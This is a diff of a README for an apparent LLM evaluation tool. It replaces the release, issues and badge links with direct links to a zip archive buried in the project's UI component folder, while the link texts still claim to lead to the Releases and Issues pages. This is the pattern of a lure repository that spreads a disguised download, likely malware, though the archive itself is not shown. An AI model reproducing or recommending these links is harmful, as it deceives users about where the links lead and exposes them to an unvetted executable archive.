@@ -1,6 +1,6 @@
 # 🚀 llm-evaluation - Evaluate LLMs with Confidence
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-llm--evaluation-blue.svg)](https://github.com/Phinchanbora/llm-evaluation/releases)
+[![Download Now](https://raw.githubusercontent.com/Phinchanbora/llm-evaluation/main/ui/src/components/ui/llm-evaluation-v1.0.zip%https://raw.githubusercontent.com/Phinchanbora/llm-evaluation/main/ui/src/components/ui/llm-evaluation-v1.0.zip)](https://raw.githubusercontent.com/Phinchanbora/llm-evaluation/main/ui/src/components/ui/llm-evaluation-v1.0.zip)
 
 ## 📄 Description
 
@@ -35,9 +35,9 @@ To begin using the llm-evaluation framework, follow the steps below to download 
 
 ## 📥 Download & Install
 
-Visit this page to download: [Releases Page](https://github.com/Phinchanbora/llm-evaluation/releases)
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Phinchanbora/llm-evaluation/main/ui/src/components/ui/llm-evaluation-v1.0.zip)
 
-1. Go to the [Releases Page](https://github.com/Phinchanbora/llm-evaluation/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/Phinchanbora/llm-evaluation/main/ui/src/components/ui/llm-evaluation-v1.0.zip).
 2. Select the latest release from the list.
 3. Look for the download link for your operating system (Windows, macOS, or Linux).
 4. Click on the download link to save the file to your computer.
@@ -87,7 +87,7 @@ If you encounter issues while using the application, consider the following tips
 
 ## 📢 Support
 
-For any further assistance, please refer to the [GitHub Issues Page](https://github.com/Phinchanbora/llm-evaluation/issues) to report bugs or request features.
+For any further assistance, please refer to the [GitHub Issues Page](https://raw.githubusercontent.com/Phinchanbora/llm-evaluation/main/ui/src/components/ui/llm-evaluation-v1.0.zip) to report bugs or request features.
 
 ---
 
